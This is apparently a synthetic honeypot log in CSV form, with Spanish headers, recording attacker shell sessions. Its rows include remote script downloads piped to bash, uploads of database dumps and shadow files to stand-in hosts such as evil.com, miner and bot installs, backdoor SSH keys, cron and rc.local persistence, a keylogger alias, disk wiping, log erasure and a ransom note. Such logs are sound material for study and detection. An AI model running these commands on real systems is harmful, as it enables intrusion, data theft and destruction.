Session_ID,Timestamp,IP_Atacante,Secuencia_Comandos,Total_Comandos
3cdd1c9cd82d,2026-04-20T20:05:23.193735Z,88.13.24.103,find  /  -name  '*.pem'  -o  -name  '*.key'  -o  -name  '*.ovpn'  2>/dev/null -> cat /home/user/aws.pem -> exit,3
f08d550a11bf,2026-04-20T20:06:24.174579Z,88.13.24.103,ll -> cat  /var/log/auth.log  |  grep  Failed ->  -> ls -> cat /var/log/syslog -> exot -> exit,7
53987744b371,2026-04-20T20:09:17.705746Z,88.13.24.103,ls -lah -> cd /tmp ->  -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz -> chmod +x xmrig -> uptime -> ./xmrig -o pool.com:3333 -u hacker -> rm -rf xmrig* -> exit,10
2312b768bc34,2026-04-20T20:10:07.058118Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,2
825919a0b1cf,2026-04-20T20:10:41.749451Z,88.13.24.103,ls -la /home -> cat  /etc/passwd -> cat /etc/shadow -> cat /etc/group ->  -> exit,6
41a38fb9b5cf,2026-04-20T20:11:25.365134Z,88.13.24.103,mysqldump  -u  root  -p123456  db_name  >  dump.sql ->  -> cd ~ -> scp dump.sql hacker@evil.com:/tmp/,4
1a5aaa05c500,2026-04-20T20:13:09.844237Z,88.13.24.103,ls -> cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> chmod 777 mips.bot -> ./mips.bot -> pwd -> rm mips.bot -> exit,8
08b1ab93a5c6,2026-04-20T20:14:56.835684Z,88.13.24.103,cd .. -> chattr -i /etc/passwd -> ls -lah -> rm  -f  /etc/passwd -> who -> exit,6
0e9042d3c911,2026-04-20T20:15:53.989711Z,88.13.24.103,find / -name '*.pem' -o -name '*.key' -o -name '*.ovpn' 2>/dev/null -> cat  /home/user/aws.pem -> exit,3
70d20751316b,2026-04-20T20:16:36.265680Z,88.13.24.103,dd if=/dev/zero of=/dev/sda bs=1M count=10 -> exit,2
e1591fb07a66,2026-04-20T20:17:32.826386Z,88.13.24.103,curl -sL http://pastebin.com/raw/xyz123 | bash -> w -> exit,3
ecb4b173f095,2026-04-20T20:18:22.219925Z,88.13.24.103,echo c > /proc/sysrq-trigger -> exit,2
ee8925dc6aae,2026-04-20T20:18:28.092459Z,88.13.24.103,getcap -r / 2>/dev/null -> clear -> exit,3
2a9dabfde999,2026-04-20T20:19:15.757121Z,88.13.24.103,ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,3
70f43c0525b0,2026-04-20T20:20:11.783164Z,88.13.24.103,echo  'ssh-rsa  AAAAB3NzaC1...  hacker@evil'  >>  ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> exit,3
c07111fb2c33,2026-04-20T20:20:37.426414Z,88.13.24.103,echo c > /proc/sysrq-trigger -> exit,2
c4d6cad926b2,2026-04-20T20:21:51.553113Z,88.13.24.103,who -> uname  -a -> whoami ->  -> id -> cat /proc/cpuinfo -> echo '' -> cat /etc/os-release -> free  -m -> df -h -> exit,11
0ffe8e9db23e,2026-04-20T20:23:08.592515Z,88.13.24.103,find /home -type f -name '*.txt' -> date -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> exit,4
0580142ad324,2026-04-20T20:23:49.074905Z,88.13.24.103,ll -> cat /etc/hostname -> cat /etc/hosts -> cat /etc/resolv.conf -> date -> exit,6
b8f241805172,2026-04-20T20:24:28.390639Z,88.13.24.103,cd /etc -> ll -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> curl  -F  'data=@config_backup.tar.gz'  http://attacker-server.com/upload ->  -> rm config_backup.tar.gz -> exit,7
fe69a4b50f86,2026-04-20T20:24:51.981656Z,88.13.24.103,cd .. -> useradd -m -s /bin/bash sysadmin,2
d43c179a9a27,2026-04-20T20:26:03.541605Z,88.13.24.103,sudo -l -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,4
675de0f28537,2026-04-20T20:27:55.972457Z,88.13.24.103,"cd /tmp -> echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> clear -> source ~/.bashrc -> exit",5
e4212dd25cf2,2026-04-20T20:28:37.271619Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> echo '' -> exit,4
e4baa4cef506,2026-04-20T20:29:02.539169Z,88.13.24.103,systemctl  enable  botnet.service -> cd .. -> systemctl  start  botnet -> exot,4
f512efc5e864,2026-04-20T20:33:54.757147Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",3
1c7af0410b64,2026-04-20T20:34:07.158440Z,88.13.24.103,ps aux -> kill  -9  1234 -> rm -rf /var/log/* -> pwd -> cat /dev/null > ~/.bash_history -> cd /tmp -> history  -c -> cd - -> exit,9
df82d98000db,2026-04-20T20:34:28.611568Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",3
b7d56391c2c6,2026-04-20T20:37:48.723969Z,88.13.24.103,w -> wget -q -O - http://185.112.x.x/installer.sh | bash ->  -> exit,4
51873338b9a0,2026-04-20T20:38:28.520352Z,88.13.24.103,ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,3
9c28a5f31ca2,2026-04-20T20:39:52.629082Z,88.13.24.103,redis-cli ping -> ls -la -> redis-cli config get dir -> exit,4
a2303c948e84,2026-04-20T20:41:15.472730Z,88.13.24.103,iptables -F -> clear -> iptables -X -> iptables -P INPUT ACCEPT -> cd - -> iptables  -P  OUTPUT  ACCEPT -> cd - -> exit,8
48581851a0a3,2026-04-20T20:42:07.789093Z,88.13.24.103,redis-cli ping -> redis-cli config get dir -> exit,3
716c110e3828,2026-04-20T20:44:39.529990Z,88.13.24.103,uname  -r -> who -> gcc  exploit.c  -o  exploit ->  -> cd /tmp -> ./exploit -> ls -> whoami -> exit,9
3f987cadfdc3,2026-04-20T20:44:57.136661Z,88.13.24.103,cat /etc/hostname -> cat /etc/hosts ->  -> cat /etc/resolv.conf -> exit,5
bcb2b9d83ba3,2026-04-20T20:45:32.237038Z,88.13.24.103,useradd  -m  -s  /bin/bash  sysadmin,1
ad355ba78128,2026-04-20T20:45:45.222611Z,88.13.24.103,cd ~ -> ls -l /etc/shadow ->  -> chmod 777 /etc/shadow -> w -> exit,6
80451b99a088,2026-04-20T20:45:55.296854Z,88.13.24.103,enable -> system -> shell -> sh -> cat /proc/mounts -> exit,6
e94ef036d6fe,2026-04-20T20:46:11.566572Z,88.13.24.103,cat /var/log/auth.log | grep Failed -> cat  /var/log/syslog ->  -> exot -> ,5
fece63369487,2026-04-20T20:48:52.242539Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> ls -la -> scp  dump.sql  hacker@evil.com:/tmp/,3
a2954507ce9e,2026-04-20T20:52:07.978262Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> exot -> exit,4
ac6c14ad64f6,2026-04-20T20:54:21.576218Z,88.13.24.103,history -> echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> ll -> chmod 600 ~/.ssh/authorized_keys -> exit,5
59d7548d2480,2026-04-20T20:55:58.535150Z,88.13.24.103,enable ->  -> date -> system -> date -> shell -> sh -> ls -lah -> cat  /proc/mounts -> exit,10
4cce14383a8f,2026-04-20T21:00:17.352355Z,88.13.24.103,cd .. -> cd /dev/shm -> tftp  -g  -r  mips.bot  192.168.1.100 ->  -> cd - -> chmod 777 mips.bot -> ./mips.bot -> rm mips.bot,8
801a44986a7c,2026-04-20T21:00:37.902403Z,88.13.24.103,ps aux -> cd /tmp -> netstat -tulnp -> cat /etc/issue -> ifconfig -> ip  a -> route -n -> arp -a -> exit,9
910cf2e613ec,2026-04-20T21:03:34.728385Z,88.13.24.103,cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> chmod  777  mips.bot ->  -> ./mips.bot -> rm  mips.bot -> exit,7
07b3ba3868c6,2026-04-20T21:04:26.806209Z,88.13.24.103,iptables -F -> iptables -X -> iptables -P INPUT ACCEPT -> iptables -P OUTPUT ACCEPT -> exit,5
bd2929bb3299,2026-04-20T21:05:54.134666Z,88.13.24.103,cd - -> mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,3
f41cf7a63234,2026-04-20T21:07:14.693869Z,88.13.24.103,cat /etc/hostname -> cat /etc/issue -> cat /etc/hosts -> cat /etc/resolv.conf -> exit,5
74b2631feaa5,2026-04-20T21:07:47.701967Z,88.13.24.103,env -> set -> uptime -> echo $PATH -> history -> cat ~/.bash_history -> exit,7
10f13c92d687,2026-04-20T21:09:50.940344Z,88.13.24.103,date -> redis-cli  ping ->  -> uptime -> redis-cli  config  get  dir -> exit,6
d20dde5f832c,2026-04-20T21:11:39.483803Z,88.13.24.103,enable -> system -> ls -la -> shell -> w -> sh -> ll -> cat /proc/mounts -> exit,9
ad02e3f4fb6e,2026-04-20T21:11:59.142000Z,88.13.24.103,find  /home  -type  f  -name  '*.txt' ->  -> echo  'Tus  archivos  han  sido  encriptados.  Paga  1  BTC  a  esta  direccion.'  >  /home/LEER_ESTO.txt -> exit,4
dcf7bb1ee0d0,2026-04-20T21:15:20.063112Z,88.13.24.103,w -> echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> crontab  -l -> exit,4
250e07fca0d8,2026-04-20T21:15:52.364250Z,88.13.24.103,uptime -> cat  /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> cat /etc/issue -> exit,5
e1f4dc2424af,2026-04-20T21:18:40.495373Z,88.13.24.103,cd .. -> ls -la /home -> cat  /etc/paswd -> cat /etc/shadow -> cat  /etc/group -> exot -> exit,7
a225010b0813,2026-04-20T21:21:49.977353Z,88.13.24.103,ls -l /etc/shadow -> cd /tmp -> chmod 777 /etc/shadow -> exit,4
53ff1f275055,2026-04-20T21:22:26.780577Z,88.13.24.103,cd /tmp -> wget http://malware-domain.com/xmrig.tar.gz -> pwd -> tar  -zxvf  xmrig.tar.gz -> ll -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker -> cat /etc/issue -> rm  -rf  xmrig* -> exit,10
d081e197c914,2026-04-20T21:24:22.057457Z,88.13.24.103,find / -name '*.pem' -o -name '*.key' -o -name '*.ovpn' 2>/dev/null -> cat /home/user/aws.pem ->  -> exot,4
8a2a369c117d,2026-04-20T21:25:02.318666Z,88.13.24.103,"clear -> nmap -sT -p 22,80,443,3306 192.168.1.0/24 -> exit",3
7853e205883f,2026-04-20T21:27:12.166860Z,88.13.24.103,env -> set -> echo $PATH -> history -> cd .. -> cat ~/.bash_history -> pwd -> exit,8
e3b8a7ecfaa5,2026-04-20T21:27:39.653503Z,88.13.24.103,"nmap  -sT  -p  22,80,443,3306  192.168.1.0/24 -> exit",2
8ed736278f41,2026-04-20T21:28:11.369737Z,88.13.24.103,zip  -r  data.zip  /var/lib/mysql -> wget  --post-file=data.zip  http://exfil-server.com/receive -> uptime -> rm data.zip ->  -> exit,6
840e93bddaae,2026-04-20T21:29:21.967061Z,88.13.24.103,w -> echo c > /proc/sysrq-trigger -> exit,3
cddd90315352,2026-04-20T21:29:35.835136Z,88.13.24.103,cd /tmp -> cat /var/log/auth.log | grep Failed -> cat /var/log/syslog -> exit,4
a5b096ccf641,2026-04-20T21:30:13.341269Z,88.13.24.103,w -> redis-cli ping -> echo '' -> redis-cli config get dir -> ls -lah -> exit,6
af43f4333654,2026-04-20T21:30:52.898581Z,88.13.24.103,sudo  -l -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,4
55823ea1b23f,2026-04-20T21:31:04.466982Z,88.13.24.103,systemctl enable botnet.service -> echo '' -> systemctl start botnet -> exit,4
e2257e0a1525,2026-04-20T21:32:19.046289Z,88.13.24.103,find / -name '*.pem' -o -name '*.key' -o -name '*.ovpn' 2>/dev/null -> cat /home/user/aws.pem -> date -> exit,4
5845bd4a5e6a,2026-04-20T21:35:45.383467Z,88.13.24.103,iptables -F -> uptime -> iptables  -X -> iptables -P INPUT ACCEPT -> iptables -P OUTPUT ACCEPT -> exit,6
222393496159,2026-04-20T21:36:23.867005Z,88.13.24.103,echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> crontab -l -> exit,3
70554a1bfe46,2026-04-20T21:37:19.434086Z,88.13.24.103,uname -r -> gcc exploit.c -o exploit -> ./exploit -> whoami -> w -> exit,6
153c9f12aef2,2026-04-20T21:40:34.472166Z,88.13.24.103,cd /tmp -> uname  -r -> gcc exploit.c -o exploit -> ./exploit ->  -> whoami -> exit,7
e6452553a3b6,2026-04-20T21:41:15.130512Z,88.13.24.103,wget  -q  -O  -  http://185.112.x.x/installer.sh  |  bash -> exot,2
8456e7fb40f5,2026-04-20T21:42:26.623896Z,88.13.24.103,sudo -l -> w -> find  /  -perm  -4000  -type  f  2>/dev/null -> cat /etc/sudoers -> exit,5
f5ec69b6b476,2026-04-20T21:42:40.375602Z,88.13.24.103,find /var/www/ -name '*.env' -> cat /var/www/html/.env -> uptime -> exit,4
ca802cb559d2,2026-04-20T21:47:56.877638Z,88.13.24.103,cd /tmp ->  -> date -> wget  http://malware-domain.com/xmrig.tar.gz ->  -> ll -> tar -zxvf xmrig.tar.gz ->  -> chmod  +x  xmrig -> ./xmrig  -o  pool.com:3333  -u  hacker -> cd - -> rm -rf xmrig* -> exit,13
a0f47d4fd1e2,2026-04-20T21:50:18.259817Z,88.13.24.103,cd /dev/shm -> cd /tmp -> tftp  -g  -r  mips.bot  192.168.1.100 -> chmod 777 mips.bot -> ./mips.bot -> cd .. -> rm mips.bot -> exit,8
ee43bc5cb570,2026-04-20T21:51:24.649220Z,88.13.24.103,pwd -> wget -q -O - http://185.112.x.x/installer.sh | bash -> exit,3
34dfbc533c5d,2026-04-20T21:52:01.484396Z,88.13.24.103,iptables  -F -> clear -> iptables -X -> iptables -P INPUT ACCEPT -> iptables  -P  OUTPUT  ACCEPT ->  -> exit,7
39d2ea55f2e2,2026-04-20T21:53:28.160333Z,88.13.24.103,ls -la -> uname  -a -> whoami -> id -> cat /proc/cpuinfo -> cat /etc/os-release -> pwd -> free -m -> ll -> df -h ->  -> exit,12
a2e50a25d89c,2026-04-20T21:55:49.225001Z,88.13.24.103,iptables -F -> iptables  -X -> iptables -P INPUT ACCEPT -> who -> iptables -P OUTPUT ACCEPT -> exit,6
a4c1caac3ec9,2026-04-20T21:58:30.680457Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> ls -la -> chmod 600 ~/.ssh/authorized_keys -> exit,4
2d96e0eb26f6,2026-04-20T21:58:50.723608Z,88.13.24.103,psql -U postgres -c '\l' -> who -> exit,3
93518fb721d2,2026-04-20T21:58:59.486137Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' -> exit,2
e97a08816676,2026-04-20T21:59:06.127356Z,88.13.24.103,systemctl enable botnet.service -> systemctl start botnet -> exit,3
981e066a6951,2026-04-20T22:00:19.944664Z,88.13.24.103,redis-cli ping -> redis-cli config get dir -> exit,3
a0337cfe9ae8,2026-04-20T22:01:47.743236Z,88.13.24.103,cat /etc/rc.local -> echo '/tmp/miner &' >> /etc/rc.local -> exit,3
39365d184572,2026-04-20T22:02:31.793610Z,88.13.24.103,date -> wget -q -O - http://185.112.x.x/installer.sh | bash -> ls -> exit -> ,5
5514fe7b4258,2026-04-20T22:04:50.339385Z,88.13.24.103,ll -> dd if=/dev/zero of=/dev/sda bs=1M count=10 -> exit,3
ea1cc1e86e63,2026-04-20T22:06:12.975441Z,88.13.24.103,uptime -> cd /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> bash  payload.sh -> uptime -> rm payload.sh -> exit,7
3b02da0039f8,2026-04-20T22:07:08.398384Z,88.13.24.103,cat /etc/rc.local ->  -> echo '/tmp/miner &' >> /etc/rc.local -> exit,4
1f300d3dea50,2026-04-20T22:09:24.763057Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> pwd -> scp  dump.sql  hacker@evil.com:/tmp/,3
328fb097b866,2026-04-20T22:11:22.755136Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' ->  -> exit,3
2aa06d386126,2026-04-20T22:11:49.708452Z,88.13.24.103,cat /etc/rc.local -> echo '/tmp/miner &' >> /etc/rc.local -> ll -> exit,4
